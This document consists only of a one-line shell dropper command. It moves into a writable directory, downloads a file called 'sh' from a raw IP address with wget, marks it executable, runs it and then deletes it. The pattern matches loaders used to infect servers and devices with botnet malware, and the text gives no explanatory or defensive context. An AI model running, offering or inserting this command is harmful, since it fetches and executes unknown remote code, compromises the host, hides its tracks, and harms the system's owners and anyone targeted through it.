cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.178.98.204/sh; chmod +x sh; ./sh; rm -rf sh
